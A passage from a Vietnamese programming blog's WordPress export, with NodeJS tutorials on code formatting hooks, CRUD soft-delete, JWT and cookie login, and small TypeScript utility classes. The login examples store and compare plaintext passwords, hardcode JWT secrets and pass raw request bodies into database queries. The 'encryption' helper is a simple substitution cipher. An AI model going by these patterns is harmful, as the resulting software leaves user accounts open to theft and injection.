- Lint-staged mục đích để chạy 1 lệnh CMD khi sử dụng lệnh git (git add, git commit ....)
- Github: <a href="https://github.com/okonet/lint-staged" rel="noopener" target="_blank">https://github.com/okonet/lint-staged</a>
<h3>1.3. Husky</h3>
- Github: <a href="https://github.com/typicode/husky/tree/master" rel="noopener" target="_blank">https://github.com/typicode/husky/tree/master</a>

<h3>1.4. Cài đặt thư viện</h3>
<pre>
npm i prettier lint-staged husky --save-dev
</pre>

<h2>2. Sử dụng Prettier: </h2>
-- Tại ./package.json -> Tạo scripts để chạy CLI
<pre>
"scripts": {
    "beautiful": "prettier --single-quote --trailing-comma all --tab-width 4 --write src/**/*.{json,js,scss}",
    "start": "nodemon --inspect src/index.js",
},
</pre>
-- Lưu ý, đường dẫn thư mục không cần có dấu nháy đơn 
-- Sử dụng CLI (Terminal)
<pre>
npm run beautiful
</pre>

<h2>3. Sử dụng Lint-staged: </h2>
<h3>3.1. Cài đặt</h3>
-- Tại ./package.json -> Tạo lint-staged (cấp 1, đứng ngang hàng với script)
<pre>
{
  "lint-staged": {
    "*": "your-cmd"
  }
}
</pre>
-- Ví dụ
<pre>
"scripts": {
    "beautiful": "lint-staged",
    "start": "nodemon --inspect src/index.js",
},

"lint-staged": {
    "src/**/*.{json,js,scss}": "prettier --single-quote --trailing-comma all --tab-width 4 --write"
},
</pre>
<h3>3.2. Sử dụng</h3>
-- Như vậy, khi ta chạy dòng lệnh CLI "npm run beautiful" thì lệnh "lint-staged" sẽ được kích hoạt.
-- "lint-staged" sẽ tìm tất cả file đang ở trạng thái "git staged files". Trong đó, những file nào match được với pattern "src/**/*.{json,js,scss}" thì sẽ chạy dòng lệnh prettier
-- File ở trạng thái "git staged files": nghĩa là file đang được git add, commit,....
-- Ví dụ: chạy lần lượt các dòng lệnh CLI để beautiful tất cả các file được add lên git
<pre>
git add .
npm run beautiful
</pre>

<h2>4. Sử dụng Husky: </h2>
-- Tại ./package.json -> Tạo husky (cấp 1, đứng ngang hàng với script)
<pre>
{
  "husky": {
    "hooks": {
      "pre-commit": "lint-staged",
      "pre-push": "npm test",
      "...": "..."
    }
  }
}
</pre>
-- Khi commit code lên git, "pre-commit" sẽ chạy trước ứng với lệnh "lint-staged".
-- Như vậy, khi git commit, code sẽ tự động được format, sau đó được đẩy lên git -> rất nhàn và hiệu quả :D]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>735</wp:post_id>
		<wp:post_date><![CDATA[2021-01-19 12:36:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-19 05:36:25]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-19 12:36:25]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-19 05:36:25]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-lam-viec-nhom-voi-git-format-code]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[Chrome Extensions]]></title>
		<link>https://duycode.com/2021/01/19/chrome-extensions/</link>
		<pubDate>Tue, 19 Jan 2021 15:29:53 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=762</guid>
		<description></description>
		<content:encoded><![CDATA[1. JSON Viewer
<img src="https://lh3.googleusercontent.com/_t_LA1P8Vot6jUw1aH2OCtE9KLcf28Y6s9FSKb-wddK92dOGhhpvPbjKFa3p7wWrvHwtnane0pPZl9C3sipn0CKa=w128-h128-e365-rj-sc0x00ffffff" alt="" />
<a href="https://chrome.google.com/webstore/detail/json-viewer/gbmdgpbipfallnflgajpaliibnhdgobh?hl=vi" rel="noopener" target="_blank">https://chrome.google.com/webstore/detail/json-viewer/gbmdgpbipfallnflgajpaliibnhdgobh?hl=vi</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>762</wp:post_id>
		<wp:post_date><![CDATA[2021-01-19 22:29:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-19 15:29:53]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-19 22:29:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-19 15:29:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[chrome-extensions]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 8. CRUD: Update]]></title>
		<link>https://duycode.com/2021/01/21/nodejs-8-crud-update/</link>
		<pubDate>Thu, 21 Jan 2021 16:13:07 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=813</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://techvccloud.mediacdn.vn/zoom/650_406/2018/11/30/crud-15435683934502144104962-crop-1543568398584927543865.png" alt="" />
<h2>1. Router</h2>
-- Tại ./src/routes/courses.js
<pre>
const express = require('express');
const router = express.Router();

const courseController = require('../app/controllers/CourseController');

router.get('/create', courseController.create);
router.post('/store', courseController.store);

//trang hiện form sửa thông tin khóa học: xxx123.com/course/:id/edit
router.get('/:id/edit', courseController.edit);
//trang chứa formData lưu khóa học: xxx123.com/course/:id
router.put('/:id', courseController.update);

router.get('/:slug', courseController.show);
router.get('/', courseController.courseList);

module.exports = router;
</pre>

<h2>2. Controller</h2>
-- Tại .src/app/controllers/CourseController.js
<pre>
const Course = require('../models/Course');

class CourseController {

    courseList(req,res,next){}
    show(req,res,next){}
    create(req, res, next) {}
    store(req, res, next) {}

    //[GET] /courses/:id/edit
    edit(req, res, next) {
        Course.findById(req.params.id)
            .then(course => {
                //khi dùng thư viện Express Handlebars, courses cần được convert sang dạng object
                course ? course.toObject() : course;
                res.render('courses/edit', {
                    course: course,
                })
            })
            .catch(next)
    }

    //UPDATE: --[PUT]-- /courses/:id
    //Khi dùng PUT, cần thêm thư viện method-override
    update(req, res, next){
        Course.updateOne({_id: req.params.id}, req.body)
        .then(()=>res.redirect('/courses/'))
        .catch(next)
    }
}

module.exports = new CourseController();
</pre>

<h2>3. View</h2>
-- Tại .src/resources/views/courses/edit.hbs
<pre>
<form class="mt-4" method="POST" action="/courses/{{course._id}}?_method=PUT">
    <input type="text" class="form-control" value="{{course.name}}" id="name" name="name">
    <textarea class="form-control" id="description" name="description">{{course.description}}</textarea>
    <input type="text" class="form-control" value="{{course.videoID}}" id="videoID" name="videoID">
    <input type="text" class="form-control" value="{{course.level}}" id="level" name="level">
    <button type="submit" class="btn btn-primary">Lưu lại</button>
</form>
</pre>

<h2>4. method-override</h2>
-- Cần dùng method-override để đổi link "/courses/{{course._id}}?_method=PUT" từ method ban đầu là GET sang method PUT
-- Cài đặt thư viện
<a href="https://www.npmjs.com/package/method-override" rel="noopener" target="_blank">https://www.npmjs.com/package/method-override</a>
<pre>
npm install method-override
</pre>
-- Tại .src/resources/index.js
<pre>
const express = require('express');
const app = express();
const methodOverride = require('method-override');
app.use(methodOverride('_method'));
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>813</wp:post_id>
		<wp:post_date><![CDATA[2021-01-21 23:13:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-21 16:13:07]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-21 23:13:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-21 16:13:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-8-crud-update]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 9. CRUD: Delete]]></title>
		<link>https://duycode.com/2021/01/22/nodejs-9-crud-delete/</link>
		<pubDate>Thu, 21 Jan 2021 17:52:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=822</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://techvccloud.mediacdn.vn/zoom/650_406/2018/11/30/crud-15435683934502144104962-crop-1543568398584927543865.png" alt="" />
Khi delete dữ liệu, thường dùng kỹ thuật Soft Delete, bao gồm: 
- Delete (soft): xóa mềm
- Restore: khôi phục
- Force delete: xóa vĩnh viễn

<h2>1. Sử dụng thư viện plugin delete cho mongoose</h1>
-- mongoose-delete: <a href="https://www.npmjs.com/package/mongoose-delete" rel="noopener" target="_blank">https://www.npmjs.com/package/mongoose-delete</a>
<h3>1.1. Cài đặt:</h3>
<pre>
npm install mongoose-delete
</pre>

<h3>1.2. Cấu hình Model</h3>
<pre>
const mongoose = require('mongoose');

const slug = require('mongoose-slug-generator');
const mongooseDelete = require('mongoose-delete');

const Schema = mongoose.Schema;

const Course = new Schema(
    {
        name: {type: String,require: true,default: '',minlength: 1,maxlength: 255,},
        description: { type: String },
        image: { type: String },
        videoID: { type: String, require: true },
        level: { type: String },
        slug: { type: String, slug: 'name', unique: true },
    },
    {
        timestamps: true,
    },
);

//Add plugins
mongoose.plugin(slug);
Course.plugin(mongooseDelete, {
    deletedAt: true,
    overrideMethods: 'all',
});

// module.exports = mongoose.model('ModelName', mySchema)
module.exports = mongoose.model('Course', Course);

</pre>


<h2>2.  Router</h2>
-- Tại ./src/routes/courses.js
<pre>
const express = require('express');
const router = express.Router();

const courseController = require('../app/controllers/CourseController');

router.get('/create', courseController.create);
router.post('/store', courseController.store);
router.get('/:id/edit', courseController.edit);
router.put('/:id', courseController.update);

//URL xóa mềm, khôi phục,và xóa vĩnh viễn khóa học: xxx123.com/course/:id
router.delete('/:id', courseController.destroy);
router.patch('/:id/restore', courseController.restore);
router.delete('/:id/force', courseController.forceDestroy);

router.get('/trash', courseController.trash);

router.get('/:slug', courseController.show);
router.get('/', courseController.index);

module.exports = router;

</pre>

<h2>3. Controller</h2>
-- Tại .src/app/controllers/CourseController.js
<pre>
const Course = require('../models/Course');

class CourseController {
    //--[GET]-- /courses/course-list -> Gửi thêm biến "deletedCount"
    courseList(req,res,next){
        Promise.all([Course.find({}), Course.countDocumentsDeleted()])
            .then(([courses, deletedCount]) =>
                res.render('courses/course-list', {
                    deletedCount,
                    courses: multipleMongooseToObject(courses),
                })
            )
            .catch(next);
    }

    show(req,res,next){}
    create(req, res, next) {}
    store(req, res, next) {
    edit(req, res, next) {}
    update(req, res, next){}

    //--[DELETE]-- /courses/:id
    destroy(req, res, next) {
        Course.delete({ _id: req.params.id })
            .then(() => res.redirect('back'))
            .catch(next);
    }

    //--[DELETE]-- /courses/:id/force
    forceDestroy(req, res, next) {
        Course.deleteOne({ _id: req.params.id })
            .then(() => res.redirect('back'))
            .catch(next);
    }


    //--[POST]-- /courses/handle-form-action -> delete nhiều item
    handleFormAction(req, res, next) {
        switch (req.body.action) {
            case 'delete':
                Course.delete({ _id: {$in: req.body.courseIds} })
                    .then(() => res.redirect('back'))
                    .catch(next);

                break;
            default: res.json({ message: 'Action is invalid' });
        }
    }

    //--[PATCH]-- /courses/:id/restore
    restore(req, res, next) {
        Course.restore({ _id: req.params.id })
            .then(() => res.redirect('back'))
            .catch(next);
    }

    //--[GET]-- /courses/trash
    trash(req, res, next) {
        Course.findDeleted({})
            .then((courses) =>
                res.render('courses/course-list-trash', {
                    courses: multipleMongooseToObject(courses),
                }),
            )
            .catch(next);
    }
}
</pre>

<h2>3. View</h2>
-- Các view có sử dụng: Boostrap 5 (Modal, Table), Jquery
<h3>3.1Tại .src/resources/views/courses/course-list.hbs</h3>
<pre>
<div class="mt4">
    <h2>Danh sách khóa học</h2>
    <a href="/courses/create" type="button" class="btn btn-primary">Đăng khóa học mới</a>
    <a href="/courses/trash" type="button" class="btn btn-secondary">Thùng rác ({{deletedCount}})</a>
</div>

<table class="table">
    <thead>
        <tr>
            <th scope="col">#</th>
            <th scope="col">Tên khóa học</th>
            <th scope="col">Trình độ</th>
            <th scope="col">Thời gian tạo</th>
            <th scope="col">Action</th>
        </tr>
    </thead>
    <tbody>

        {{#each courses}}
        <tr>
            <th scope="row">{{sum @index 1}}</th>
            <td>{{this.name}}</td>
            <td>{{this.level}}</td>
            <td>{{this.createdAt}}</td>
            <td>
                <a href="/courses/{{this._id}}/edit" class="btn btn-link">Sửa</a>
                <a href="" class="btn btn-link" data-bs-toggle="modal" data-id="{{this._id}}"
                    data-bs-target="#delete-course-modal">Xóa</a>
            </td>
        </tr>

        {{else}}
        <tr>
            <td colspan="5" class="text-center">
                Danh sách trống
                <a href="/courses/create" type="button" class="btn btn-primary">Đăng khóa học mới</a>
            </td>
        </tr>
        {{/each}}
    </tbody>
</table>


{{!-- confirm delete course --}}
<div class="modal" tabindex="-1" id="delete-course-modal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Xóa khóa học ?</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p>Bạn chắc chắn muốn xóa khóa học này ?</p>
            </div>
            <div class="modal-footer">
                <button id="btn-delete-course" type="button" class="btn btn-danger">Xóa bỏ</button>
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
            </div>
        </div>
    </div>
</div>

{{!-- Delete hiden form --}}
<form method="POST" name="action-course-form"></form>

<script>
    let courseDeleteID;
    let modal = document.getElementById('delete-course-modal');
    let actionForm = document.forms['action-course-form'];

    modal.addEventListener('show.bs.modal', function (event) {
        let button = event.relatedTarget;
        courseDeleteID = button.getAttribute('data-id');
    })

    $("#btn-delete-course").click(function () {
        actionForm.action = '/courses/' + courseDeleteID + '?_method=DELETE';
        actionForm.submit();
    })
</script>
</pre>

<h3>3.1Tại .src/resources/views/courses/course-list-trash.hbs</h3>
<pre>
<div class="mt-4">
    <div>
        <a href="/courses">Danh sách khóa học</a>
        <h3>Khóa học đã xóa</h3>
    </div>

    <table class="table">
        <thead>
            <tr>
                <th scope="col">#</th>
                <th scope="col">Tên khóa học</th>
                <th scope="col">Trình độ</th>
                <th scope="col">Thời gian xóa</th>
                <th scope="col">Action</th>
            </tr>
        </thead>
        <tbody>

            {{#each courses}}
            <tr>
                <th scope="row">{{sum @index 1}}</th>
                <td>{{this.name}}</td>
                <td>{{this.level}}</td>
                <td>{{this.deletedAt}}</td>
                <td>
                    <a href="" class="btn btn-link btn-restore" data-id="{{this._id}}">Khôi phục</a>
                    <a href="" class="btn btn-link" data-bs-toggle="modal" data-id="{{this._id}}"
                        data-bs-target="#delete-course-modal">Xóa vĩnh viễn</a>
                </td>
            </tr>

            {{else}}
            <tr>
                <td colspan="5" class="text-center">
                    Thùng rác trống
                    <a href="/me/stored/courses">Danh sách khóa học</a>
                </td>
            </tr>
            {{/each}}
        </tbody>
    </table>
</div>

{{!-- confirm delete course --}}
<div class="modal" tabindex="-1" id="delete-course-modal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Xóa khóa học ?</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p>Hành động này không thể khôi phục. Bạn vẫn muốn xóa khóa học này ?</p>
            </div>
            <div class="modal-footer">
                <button id="btn-delete-course" type="button" class="btn btn-danger">Xóa vĩnh viễn</button>
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
            </div>
        </div>
    </div>
</div>


<form method="POST" name="action-course-form"></form>

<script>
    let courseDeleteID;
    let modal = document.getElementById('delete-course-modal');
    let actionForm = document.forms['action-course-form'];

    modal.addEventListener('show.bs.modal', function (event) {
        let button = event.relatedTarget;
        courseDeleteID = button.getAttribute('data-id');
    })

    $('#btn-delete-course').click(function (e) {
        e.preventDefault();
        actionForm.action = '/courses/' + courseDeleteID + '/force?_method=DELETE';
        actionForm.submit();
    })

    $('.btn-restore').click(function (e) {
        e.preventDefault();
        let id = $(this).data('id')
        actionForm.action = '/courses/' + id + '/restore?_method=PATCH';
        actionForm.submit();
    })
</script>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>822</wp:post_id>
		<wp:post_date><![CDATA[2021-01-22 00:52:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-21 17:52:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-22 00:52:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-21 17:52:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-9-crud-delete]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 10. Login]]></title>
		<link>https://duycode.com/2021/01/22/nodejs-10-login/</link>
		<pubDate>Thu, 21 Jan 2021 18:24:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=824</guid>
		<description></description>
		<content:encoded><![CDATA[Các kiến thức sử dụng:
 - Cookies, signedCookies,
 - JWT

<h2>1. Sử dụng JWT - jsonwebtoken</h2>
- jwt: <a href="https://jwt.io/" rel="noopener" target="_blank">https://jwt.io/</a>
- npm: https://www.npmjs.com/package/jsonwebtoken
<pre>
npm install jsonwebtoken
</pre>
<pre>
var jwt = require('jsonwebtoken');

var data = {_id : 'duycode'};
var token = jwt.sign(data,'kjKJK#XC&*ZCDS#', {
    expiresIn: 30
});

var tokenString = token;
var decode = jwt.verify(tokenString,'kjKJK#XC&*ZCDS#');
 
console.log(token)
console.log(decode)
//eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiJkdXljb2RlIiwiaWF0IjoxNjExNzI5NjE3fQ.GSiTLZIqgUDyj-JdGZjo1lR72WBdajbNj96BxZAA3ms
//{ _id: 'duycode', iat: 1611730075, exp: 1611730105 }
</pre>

<h2>2. Sử dụng cookie-parser</h2>
</pre>
npm install cookie-parser
</pre>
-- Khi login, lưu lại biến cookie
<pre>
   //--[POST]--    /login
    loginStore(req, res, next) {
        let gmail = req.body.gmail;
        let password = req.body.password;
        User.findOne({
            gmail: gmail,
            password: password,
        })
        .then((data)=>{
            if(data){
                let token = jwt.sign({_id: data._id},'mktoken');
                res.cookie('userID',token);
                return res.redirect('/');
            }else{
                return res.redirect('/login');
            }
    
        })
        .catch(err=>{
            return res.redirect('/login');
        })
    }
</pre>

-- Dùng middleware để kiểm tra mỗi lần request, nếu có cookie rồi thì cho qua, nếu không có phải đăng nhập
<pre>
const authMiddleware = require('../app/middlewares/AuthMiddleware');
    app.use('/admin',authMiddleware.requireAuth, adminRouter);
    app.use('/manager',authMiddleware.requireAuth, managerRouter)
</pre>
--Middleware viết như sau:
<pre>
const User = require('../models/User');
const jwt = require('jsonwebtoken');

module.exports.requireAuth = function (req, res, next) {
    if (!req.cookies.userID) {
        res.redirect('/login');
    }

    let userID;
    try {
        let token = req.cookies.userID;
        userID = jwt.verify(token, 'mktoken');
    } catch (error) {
        res.redirect("/login")
    }

    if (userID) {
        User.findById(userID)
            .then(() => next())
            .catch(err => {
                return res.redirect('/login');
            })
    }
}
</pre>

<h1>II. Nhớ 2 </h1>
<h2>1. Sử dụng thư viện</h1>
1.1. JWT:
-- Cài đặt: <a href="https://www.npmjs.com/package/jsonwebtoken" rel="noopener" target="_blank">https://www.npmjs.com/package/jsonwebtoken</a>
** Sử dụng:
-- Đóng gói dữ liệu: { _id: user._id }
<pre>
let token = jwt.sign(
    { _id: user._id },
    process.env.SECRET_JWT,
    { expiresIn: 60 * 60 }
);
</pre>
-- Giải nén dữ liệu: 
<pre>
let data = jwt.verify(token, process.env.SECRET_JWT)
//data -> { _id: user._id }
</pre>

1.2. cookie-parser
-- Cài đặt: <a href="https://www.npmjs.com/package/cookie-parser" rel="noopener" target="_blank">https://www.npmjs.com/package/cookie-parser</a>

-- Tại ./src/server.js
<pre>
const cookieParser = require('cookie-parser');
app.use(cookieParser(process.env.SECRET_SIGNEDCOOKIES));
</pre>
-- Sử dụng:

<pre>
// Set cookie cho response, -> key: 'userID'; value: token
res.cookie('userID', token, {
    signed: true,
});
//Get cookie
let token = req.signedCookies.userID;
//Delete cookie
res.clearCookie('userID');
</pre>

1.3. Khai báo thêm biến của .env hoặc trên Heroku
<pre>
SECRET_JWT=@%Abc@*678
SECRET_SIGNEDCOOKIES=@$123%@#XYZ
</pre>

<h2>2. Register</h2>
<pre>
registerStore(req, res, next) {
    Object.assign(req.body, {
        createdAt: Date.now(),
        updatedAt: Date.now(),
        removedAt: 0,
        Role: "Manager",
    })
    const user = new User(req.body);
    const phongkham = new PhongKham(req.body);

    Promise.all([user.save(), phongkham.save()])
        .then(([user, phongkham]) => {
            Promise.all([
                User.updateOne({ '_id': user._id }, { 'PhongKhamID': phongkham._id }),
                PhongKham.updateOne({ '_id': phongkham._id }, { 'QuanLyID': user._id })
            ])
                .then(() => {
                //tạo token trong 1 giờ
                let token = jwt.sign(
                    { _id: user._id },
                    process.env.SECRET_JWT,
                    { expiresIn: 60 * 60 }
                );
                res.cookie('userID', token, {
                    signed: true,
                });
                    return res.json(true);
                })
                .catch(() => {
                    return res.json(false);
                })
        })
        .catch(err => {
            return res.json(false);
        });
}
</pre>

<h2>3. Login</h2>
<pre>
loginStore(req, res, next) {
    User.findOne({
        Gmail: req.body.Gmail,
        Password: req.body.Password
    })
        .then((user) => {
            if (user) {
                //tạo token trong 1 giờ
                let token = jwt.sign(
                    { _id: user._id },
                    process.env.SECRET_JWT,
                    { expiresIn: 60 * 60 }
                );
                res.cookie('userID', token, {
                    signed: true,
                });
                return res.json(true);
            } else {
                return res.json(false);
            }
        })
        .catch(err => {
            return res.json(false);
        })
}
</pre>

<h2>4. Logout</h2>
<pre>
logout(req, res, next) {
    res.clearCookie('userID');
    res.redirect('/')
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>824</wp:post_id>
		<wp:post_date><![CDATA[2021-01-22 01:24:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-21 18:24:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-22 01:24:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-21 18:24:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-10-login]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NPM và NPX cơ bản]]></title>
		<link>https://duycode.com/2021/01/25/npm-va-npx-co-ban/</link>
		<pubDate>Mon, 25 Jan 2021 12:50:07 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=845</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Publish project lên npm</h2>
-- Trong file: "package.json" để chế độ publish
<blockquote>
{
  "publishConfig": {
    "access": "public"
  }
}
</blockquote>
npm login
npm publish

<h2>2. Publish project có sử dụng npx</h2>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>845</wp:post_id>
		<wp:post_date><![CDATA[2021-01-25 19:50:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-25 12:50:07]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-25 19:50:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-25 12:50:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[npm-va-npx-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[MyClass - Những Class hay nhất của duycode.com]]></title>
		<link>https://duycode.com/2021/02/03/myclass-nhung-class-hay-nhat-cua-duycode-com/</link>
		<pubDate>Wed, 03 Feb 2021 15:59:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=865</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. MyString</h2>
<pre>
class MyString {
    public static readonly charset =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

    public static generateCharset = (privateKey: string, charset?: string): string => {
        let tempString = charset || this.charset
        let result = ''
        for (let i = 0; i < this.charset.length; i += 1) {
            const kIndex = i % privateKey.length
            const charCode = privateKey.charCodeAt(kIndex)
            const tIndex = charCode % tempString.length

            result = tempString[tIndex] + result
            tempString = tempString.substring(0, tIndex) + tempString.substring(tIndex + 1)
        }
        return result
    }

    public static randomString = (length: number, charset?: string) => {
        const characters = charset || this.charset
        let result = ''
        for (let i = 0; i < length; i += 1) {
            result += characters.charAt(Math.floor(Math.random() * characters.length))
        }
        return result
    }

    public static encript = (rootString: string, privateKey: string): string => {
        const hash = this.generateCharset(privateKey)
        let result = ''
        for (let i = 0; i < rootString.length; i += 1) {
            const index = this.charset.indexOf(rootString[i])
            if (index === -1) {
                result += rootString[i]
            } else {
                result += hash[index]
            }
        }
        return result
    }

    public static decript = (cipherText: string, privateKey: string): string => {
        const hash = this.generateCharset(privateKey)
        let result = ''
        for (let i = 0; i < cipherText.length; i += 1) {
            const index = hash.indexOf(cipherText[i])
            if (index === -1) {
                result += cipherText[i]
            } else {
                result += this.charset[index]
            }
        }
        return result
    }
}
</pre>

<h2>2. Date Time</h2>
<pre>
export default class MyDatetime {
    public static timeToText = (time: Date, pattern: string) => {
        const rules = {
            YYYY: `${time.getFullYear()}`,
            YY: `${time.getFullYear()}`.slice(-2),
            MM: `0${time.getMonth() + 1}`.slice(-2),
            DD: `0${time.getDate()}`.slice(-2),
            hh: `0${time.getHours()}`.slice(-2),
            mm: `0${time.getMinutes()}`.slice(-2),
            ss: `0${time.getSeconds()}`.slice(-2),
        }

        let text = pattern
        Object.entries(rules).forEach(([key, value]) => {
            text = text.replace(key, value)
        })

        return text
    }

    public static textToTime = (text: string, pattern: string) => {
        const iFullYear = pattern.indexOf('YYYY')
        const iMonth = pattern.indexOf('MM')
        const iDay = pattern.indexOf('DD')
        const iHours = pattern.indexOf('hh')
        const iMinutes = pattern.indexOf('mm')
        const iSeconds = pattern.indexOf('ss')
        const iMs = pattern.indexOf('xxx')

        const year = iFullYear !== -1 ? Number(text.slice(iFullYear, iFullYear + 4)) : 0
        const month = iMonth !== -1 ? Number(text.slice(iMonth, iMonth + 2)) : 0
        const date = iDay !== -1 ? Number(text.slice(iDay, iDay + 2)) : 0
        const hours = iHours !== -1 ? Number(text.slice(iHours, iHours + 2)) : 0
        const minutes = iMinutes !== -1 ? Number(text.slice(iMinutes, iMinutes + 2)) : 0
        const seconds = iSeconds !== -1 ? Number(text.slice(iSeconds, iSeconds + 2)) : 0
        const milliseconds = iMs !== -1 ? Number(text.slice(iMs, iMs + 3)) : 0

        const time = new Date()
        time.setFullYear(year)
        time.setMonth(month - 1)
        time.setDate(date)
        time.setHours(hours)
        time.setMinutes(minutes)
        time.setSeconds(seconds)
        time.setMilliseconds(milliseconds)

        return time
    }
}

</pre>

<h2>3. Khác</h2>
<pre>

class MyObject {
    static checkDirectExists(object, direct) {
        let arr = direct.split(".");
        let dir = "object";
        for (let i = 0; i < arr.length; i++) {
